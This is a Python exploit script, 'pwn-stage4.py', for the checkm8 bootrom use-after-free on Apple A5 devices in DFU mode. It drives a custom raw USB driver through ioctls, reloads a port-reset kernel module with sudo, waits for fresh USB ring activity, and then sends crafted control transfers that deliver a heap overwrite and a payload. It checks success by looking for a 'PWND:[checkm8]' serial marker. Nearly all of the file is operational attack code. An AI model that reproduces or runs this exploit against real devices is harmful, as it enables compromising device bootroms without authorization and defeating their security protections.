#!/usr/bin/env python3
"""pwn-stage4.py - freshness-gated stage 3 for the poisoned-heap DFU.

The failure mode of stage3-direct: after a PR, IOC_STATE can read 1
from a capture whose slot is already dead (khubd dropped the attempt),
so TDs push into a corpse ring - pure theater. The gate here: after
the PR, require the ring to MOVE (deq_off or trbs_pushed changed vs
the pre-PR sample) before trusting the capture. Then:

  armed crit-IN (AA-staged) -> readback: SERVED = the chip fetched
  -> UAF write + payload, back-to-back, no sleeps
  -> IOC12 PR -> verify PWND:[checkm8]
"""
import ctypes
import fcntl
import importlib.util
import os
import struct
import subprocess
import sys
import time

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
TOOLS = os.path.join(REPO, 'tools')

sp = importlib.util.spec_from_file_location('pwn', os.path.join(TOOLS, 'checkm8-a5-pwn.py'))
P = importlib.util.module_from_spec(sp)
sp.loader.exec_module(P)

IOC_CYC = (1 << 30) | (32 << 16) | (ord('R') << 8) | 5
IOC_STATE = (2 << 30) | (40 << 16) | (ord('R') << 8) | 3
RB_SIZE = 4 + 4 + 0x1000
IOC_RW = (3 << 30) | (RB_SIZE << 16) | (ord('R') << 8) | 7
IOC_PORTRESET = (3 << 30) | (16 << 16) | (ord('R') << 8) | 12


def cyc(fd, setup, data, settle_us=1000):
    arr = (ctypes.c_ubyte * max(len(data), 1)).from_buffer_copy(
        bytes(data) if data else b'\x00')
    txn = struct.pack('<8sIBBHIIQ', bytes(setup), len(data), 1, 1, 0,
                      settle_us, 0, ctypes.addressof(arr))
    try:
        fcntl.ioctl(fd, IOC_CYC, txn, True)
        return 0
    except OSError as e:
        _ = arr
        return -e.errno


def readback(fd, n=16):
    rb = bytearray(RB_SIZE)
    struct.pack_into('<I', rb, 0, n)
    fcntl.ioctl(fd, IOC_RW, rb, True)
    st, = struct.unpack_from('<I', rb, 4)
    return st, bytes(rb[8:8 + n])


def state(fd):
    buf = bytearray(40)
    fcntl.ioctl(fd, IOC_STATE, buf, True)
    return struct.unpack_from('<QIIIIIIII', buf, 0)


def pr_module():
    subprocess.run(['sudo', '-n', 'insmod', '/tmp/raw0rb/raw0reset.ko',
                    'bdf=0000:04:00.4', 'port=5', 'mode=1'],
                   capture_output=True, timeout=20)
    subprocess.run(['sudo', '-n', 'rmmod', 'raw0reset'],
                   capture_output=True, timeout=10)


def main():
    payload, overwrite = P.load_payloads('classic')
    print('*** stage4: freshness-gated, payload=%d overwrite=%d ***'
          % (len(payload), len(overwrite)))

    fd = os.open('/dev/raw0', os.O_RDWR)
    rounds = 8
    for r in range(rounds):
        print('== round %d ==' % r)
        f_pre = state(fd)
        pr_module()
        # freshness gate: wait for the ring to move
        t0 = time.time()
        fresh = False
        f = f_pre
        while time.time() - t0 < 25.0:
            f = state(fd)
            if f[5] and (f[6] != f_pre[6] or f[7] != f_pre[7] or f[4] != f_pre[4]):
                fresh = True
                break
            time.sleep(0.005)
        if not fresh:
            print('   stale capture (ring frozen) - PR again')
            continue
        print('   fresh: slot=%d trbs=%d deq_off=%d cycle=%d'
              % (f[1], f[6], f[7], f[4]))

        rc = cyc(fd, bytes([0x80, 0x06, 0x03, 0x03, 0x0A, 0x04, 0x81, 0x00]),
                 b'\xAA' * 0x41)
        st, data = readback(fd, 32)
        if data == b'\xAA' * 32:
            print('   crit-IN rc=%d -> SILENT (chip did not serve)' % rc)
            continue
        print('   crit-IN rc=%d -> SERVED: %s' % (rc, data.hex()))

        # the window is open - fire the rest back-to-back
        rc = cyc(fd, bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00]),
                 b'\xCC' * 0x40 + overwrite)
        print('   UAF write CYC rc=%d' % rc)
        rc = cyc(fd, bytes([0x21, 0x01, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x02]),
                 b'\xCC' * 0x40 + payload)
        print('   payload CYC rc=%d' % rc)

        buf = bytearray(struct.pack('<IIII', 1, 0, 0, 0))
        fcntl.ioctl(fd, IOC_PORTRESET, buf, True)
        before, after = struct.unpack_from('<II', buf, 4)
        print('   PR: %08x -> %08x' % (before, after))

        t0 = time.time()
        serial = None
        while time.time() - t0 < 30.0:
            serial = P.sysfs_dfu(timeout=2.0)[1]
            if serial:
                break
            pr_module()
        print('   verify serial: %r' % serial)
        if serial and P.PWN_MARKER in serial:
            print('*** PWNED DFU - host-only checkm8 A5 achieved ***')
            os.close(fd)
            return 0
        print('   not pwned yet')
    print('exhausted rounds without PWND')
    os.close(fd)
    return 2


if __name__ == '__main__':
    sys.exit(main())
